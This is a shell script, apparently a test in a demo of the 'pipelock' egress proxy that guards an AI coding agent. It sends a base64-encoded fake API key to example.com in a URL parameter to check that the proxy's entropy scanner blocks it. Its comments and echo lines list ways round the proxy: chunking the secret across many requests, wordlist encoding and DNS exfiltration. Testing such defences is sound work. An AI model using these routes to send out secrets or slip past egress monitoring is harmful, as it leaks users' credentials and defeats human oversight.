#!/bin/sh
# Attempt 3 — encoded blob, hoping to slip past the regex scanner.
#
# Idea: if pipelock looks for `sk-ant-...`, what if we base64-encode the key
# first? The regex won't match. But a high-entropy random-looking string
# in a URL is itself a signal — pipelock measures Shannon entropy on URL
# segments and refuses requests above a threshold.
#
# Expected output:
#   403 Forbidden — entropy 5.1 exceeds threshold 4.5
#
# What this proves: regex matching is necessary but not sufficient. Entropy
# analysis catches a class of bypasses that string-matching misses.
#
# Real bypasses still exist: low-entropy encodings (e.g., wordlist
# encoding), splitting the secret across many short requests, exfil over
# DNS, etc. Each is harder than the last. That's the point — defense
# raises the bar, doesn't make the wall infinite.

set -eu

# A high-entropy blob — base64 of a random fake "secret"
BLOB="c2stYW50LWFwaTAzLUZBS0VLRVlfaGlnaF9lbnRyb3B5X2RhdGFfdG9fdGVzdF9waXBlbG9ja18xMjM0NTY3ODkwYWJjZGVmZ2hpams="

echo "→ Attack 3: high-entropy blob in URL parameter"
echo "  curl -x http://pipelock:8888 \\"
echo "       \"https://example.com/x?d=\$BLOB\""
echo ""

curl -sS -o /dev/null -w "%{http_code}\n" \
     -x http://pipelock:8888 \
     -H "X-Pipelock-Agent: opencode-attack-test" \
     "https://example.com/x?d=${BLOB}" || true

echo ""
echo "If you saw 403, the entropy scanner caught it."
echo ""
echo "Now try to bypass it. Some real options:"
echo "  - chunk the secret into 4-character pieces, send each in a separate"
echo "    request (low entropy per request, but lots of requests — pipelock's"
echo "    rate limiter notices that)"
echo "  - encode using a wordlist (low entropy, looks like sentences)"
echo "  - exfil over DNS (pipelock's HTTP proxy doesn't see DNS queries —"
echo "    but the agent container has no DNS resolver other than Docker's,"
echo "    which only resolves names within the internal network)"
echo ""
echo "None of these is trivial. That's the win."
